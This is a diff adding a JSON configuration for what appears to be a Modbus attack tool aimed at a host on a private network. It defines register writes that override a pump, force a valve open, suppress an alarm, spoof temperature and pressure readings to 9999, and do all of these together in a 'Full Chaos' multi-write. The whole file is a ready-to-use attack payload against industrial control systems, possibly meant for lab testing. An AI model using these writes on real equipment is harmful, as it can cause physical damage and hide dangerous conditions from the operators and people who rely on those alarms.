@@ -1,0 +1,46 @@
+{
+  "target":      "192.168.10.20",
+  "port":        502,
+  "unit_id":     1,
+  "delay_ms":    600,
+  "report_output": "./reports/",
+
+  "attacks": [
+    {
+      "name":     "Pump Override ON",
+      "fc":       6,
+      "register": 1,
+      "value":    1
+    },
+    {
+      "name":     "Valve Force Open",
+      "fc":       6,
+      "register": 2,
+      "value":    1
+    },
+    {
+      "name":     "Alarm Suppress",
+      "fc":       6,
+      "register": 3,
+      "value":    0
+    },
+    {
+      "name":     "Temperature Spoof",
+      "fc":       6,
+      "register": 4,
+      "value":    9999
+    },
+    {
+      "name":     "Pressure Spoof",
+      "fc":       6,
+      "register": 5,
+      "value":    9999
+    },
+    {
+      "name":     "Multi-write Full Chaos",
+      "fc":       16,
+      "start_reg": 1,
+      "values":   [1, 1, 0, 9999, 9999]
+    }
+  ]
+}
